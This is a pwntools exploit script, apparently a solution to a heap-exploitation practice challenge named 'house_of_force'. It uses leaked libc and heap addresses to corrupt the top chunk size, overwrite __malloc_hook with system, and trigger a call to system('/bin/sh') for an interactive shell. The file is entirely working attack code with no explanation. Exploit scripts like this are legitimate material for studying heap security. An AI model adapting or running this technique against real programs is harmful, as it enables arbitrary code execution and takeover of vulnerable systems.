from pwn import *

context.log_level = 'debug'
context.binary = elf = ELF('./house_of_force', checksec=False)

libc = elf.libc

gs = """
b *main
b *main+295
b *main+448
"""

def info(mes):
    return log.info(mes)
    
def start():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript=gs)
    else:
        return process(elf.path)
    
def malloc(io, size, data):
    io.recvuntil(b'> ')
    io.send(b'1')
    io.recvuntil(b'size: ')
    io.send(f'{size}'.encode())
    io.recvuntil(b'data: ')
    io.send(data)
 
    
io = start()

io.recvuntil(b'puts() @ ')
puts_leak = int(io.recvn(14), 16) 
libc.address = puts_leak - libc.sym['puts']
io.recvuntil(b'heap @ ')
io.timeout = 0.1                #important

heap_leak = int(io.recvn(8), 16)
info("The address of puts:: "+ hex(puts_leak))
info("The address of heap: " + hex(heap_leak))
info("The address of libc: " + hex(libc.address))

distance = libc.sym['__malloc_hook'] - 0x20 - (heap_leak + 0x20)

malloc(io, 24, b'a'*24 + p64(0xffffffffffffffff))
malloc(io, distance, b'/bin/sh\x00')
malloc(io, 24, p64(libc.sym['system']))

#Option 1
#cmd = heap_leak + 0x30  #the address save "/bin/sh"
#malloc(io, cmd, b'')

#Option 2
cmd = next(libc.search(b"/bin/sh\x00"))
malloc(io, cmd, b' ')


io.interactive() 

